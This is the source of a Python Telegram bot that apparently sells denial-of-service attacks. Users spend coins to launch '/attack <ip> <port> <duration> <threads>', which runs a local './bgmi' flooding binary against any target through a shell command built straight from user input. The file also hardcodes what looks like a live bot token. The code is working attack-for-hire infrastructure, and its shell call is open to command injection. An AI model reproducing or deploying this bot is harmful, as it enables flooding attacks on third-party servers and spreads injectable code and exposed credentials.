import os
import asyncio
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

TELEGRAM_BOT_TOKEN = '7094229080:AAEDql1mLp-JEEpw9n9vBzRDfVZ965mzPy8'  # Replace with your bot token
OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)

# Store user data as {user_id: {"username": username, "coins": coins}}
user_data = {}  
admins = set()
is_attack_running = False  # Track if an attack is running
max_duration = 300  # Max attack duration in seconds
LOGS_FILE = "user_logs.txt"  # File to store user logs

# Function to save user data to logs file
def save_user_logs():
    with open(LOGS_FILE, "w") as file:
        for user_id, data in user_data.items():
            username = data.get("username", "No Username")
            coins = data.get("coins", 0)
            file.write(f"User ID: {user_id}, Username: {username}, Coins: {coins}\n")

# Start Command
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username or "No Username"

    # Initialize user data if not exists
    if user_id not in user_data:
        user_data[user_id] = {"username": username, "coins": 0}
    else:
        # Update username if it has changed
        user_data[user_id]["username"] = username

    # Remove the "Balance💰" button from the keyboard
    keyboard = []  # No buttons in the keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration> <threads>*\n\n"
        "*⚔️ (Costs 5 coins per attack) ⚔️*\n\n"
        "*Owners & Admins can add coins for users*\n\n"
        "*⚔️Let the war begin! 💥*"
    )
    
    await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=reply_markup)

# Attack Command (Only one attack at a time)
async def attack(update: Update, context: CallbackContext):
    global is_attack_running  
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    username = update.effective_user.username or "No Username"

    if is_attack_running:
        await update.message.reply_text("⚠️ *Please wait, an attack is already running!*", parse_mode='Markdown')
        return

    # Initialize user data if not exists
    if user_id not in user_data:
        user_data[user_id] = {"username": username, "coins": 0}
    else:
        # Update username if it has changed
        user_data[user_id]["username"] = username

    if user_data[user_id]["coins"] < 5:
        await update.message.reply_text("❌ *Not enough coins! You need 5 coins per attack.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 4:
        await update.message.reply_text("⚠️ *Usage: /attack <ip> <port> <duration> <threads>*", parse_mode='Markdown')
        return

    ip, port, duration, threads = args
    duration = int(duration)
    threads = int(threads)

    if duration > max_duration:
        await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
        return

    user_data[user_id]["coins"] -= 5  
    is_attack_running = True  

    # Display user info and remaining coins
    remaining_coins = user_data[user_id]["coins"]
    await update.message.reply_text(
        f"⚔️ *Attack Started by*: {username} (ID: {user_id})\n"
        f"💰 *Remaining Coins*: {remaining_coins}\n\n"
        f"🎯 *Target*: {ip}:{port}\n"
        f"🕒 *Duration*: {duration} sec (Max: {max_duration} sec)\n"
        f"🧵 *Threads*: {threads}\n"
        f"🔥 *Let the battlefield ignite! 💥*",
        parse_mode='Markdown'
    )

    # Run attack in the background
    asyncio.create_task(run_attack(chat_id, ip, port, duration, threads, context))

# Run Attack (Non-blocking)
async def run_attack(chat_id, ip, port, duration, threads, context):
    global is_attack_running
    try:
        process = await asyncio.create_subprocess_shell(
            f"./bgmi {ip} {port} {duration} {threads}",  
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await process.communicate()
    finally:
        is_attack_running = False  
        await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Completed!*", parse_mode='Markdown')

# Add Coins
async def add_coins(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if update.effective_user.username != OWNER_USERNAME and user_id not in admins:
        await update.message.reply_text("❌ *You are not authorized to use this command!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 2:
        await update.message.reply_text("⚠️ *Usage: /addcoins <user_id> <amount>*", parse_mode='Markdown')
        return

    target_user_id, amount = int(args[0]), int(args[1])
    if target_user_id not in user_data:
        user_data[target_user_id] = {"username": "No Username", "coins": 0}
    user_data[target_user_id]["coins"] += amount
    await update.message.reply_text(f"✅ *Added {amount} coins to user {target_user_id}*")

# Add Admin
async def add_admin(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can add admins!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text("⚠️ *Usage: /addadmin <user_id>*", parse_mode='Markdown')
        return

    admin_id = int(args[0])
    admins.add(admin_id)
    await update.message.reply_text(f"✅ *User {admin_id} is now an admin!*")

# Remove Admin
async def remove_admin(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can remove admins!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text("⚠️ *Usage: /removeadmin <user_id>*", parse_mode='Markdown')
        return

    admin_id = int(args[0])
    admins.discard(admin_id)
    await update.message.reply_text(f"✅ *User {admin_id} is no longer an admin!*")

# Set Max Attack Duration
async def set_max_duration(update: Update, context: CallbackContext):
    global max_duration

    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can set max duration!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1 or not args[0].isdigit():
        await update.message.reply_text("⚠️ *Usage: /setmaxduration <seconds>*", parse_mode='Markdown')
        return

    max_duration = min(int(args[0]), 3600)  
    await update.message.reply_text(f"✅ *Max attack duration set to {max_duration} seconds!*")

# Download Logs Command
async def download_logs(update: Update, context: CallbackContext):
    if update.effective_user.username != OWNER_USERNAME:
        await update.message.reply_text("❌ *Only the owner can download logs!*", parse_mode='Markdown')
        return

    save_user_logs()  # Save the current user data to the logs file
    await update.message.reply_document(document=open(LOGS_FILE, "rb"))

# Main Bot Setup
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("addcoins", add_coins))
    application.add_handler(CommandHandler("addadmin", add_admin))
    application.add_handler(CommandHandler("removeadmin", remove_admin))
    application.add_handler(CommandHandler("setmaxduration", set_max_duration))
    application.add_handler(CommandHandler("downloadlogs", download_logs))

    application.run_polling()

if __name__ == '__main__':
    main()
